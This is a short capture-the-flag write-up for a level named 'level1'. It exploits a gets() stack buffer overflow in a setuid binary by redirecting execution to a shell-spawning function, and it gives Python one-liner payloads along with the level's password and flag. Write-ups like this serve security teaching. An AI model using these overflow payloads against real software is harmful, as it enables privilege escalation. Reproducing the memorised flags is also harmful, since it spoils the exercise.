# level1

## Vulnerability: Trivial buffer overflow

level1's password: `1fe8a524fa4bec01ca4ea2a869af2a02260d4a7d5fe7e7c24d8617e6dca12d3a`

1. examinate existing files and permissions

```shell
ls -la
```

shows that the level1 executable belongs to level2, privilege escalation should be possible

2. get the executable (from an external device), decompile it using [ghidra](https://github.com/NationalSecurityAgency/ghidra) and examine the resulting code

```shell
scp -P 4242 level1@<host>:level1 .
```

c file shows a simple `gets()` function that reads from stdin and puts the result in a variable, we might be able to spawn a shell using a buffer overflow. An unsued function itself spawns a shell, we might want to use it.

3. test the vulnerability

```shell
python -c 'print "k"*100' | ./level1
```

shows a SEGV, meaning that the program is vulnerable, we can use a buffer overflow to overwrite the return address and execute arbitrary code

4. exploit the buffer

either by using `exploit.py` or by reading the variable declaration in the c file we can calculate the padding of 76. It would also be possible to get it with gdb, but I did succeed without using gdb. Using `objdump -d level1` we can get `run`'s function's address, an thus run the exploit. Keep in mind that memory uses little endian addressing, thus converting `12345678` to `\x78\x56\x34\x12`.

```shell
python -c 'print "k"*76 + "<little endian address>"' | ./level1
```

5. use cat to read from stdin and access the shell (otherwise the program exits)

```shell
(python -c 'print "k"*76 + "<little endian address>"' ; cat) | ./level1
```

6. get the flag

```shell
whoami
cat /home/user/level2/.pass
```

gives flag: `53a4a712787f40ec66c3c26c1f4b164dcad5552b038bb0addd69bf5bf6fa8e77`
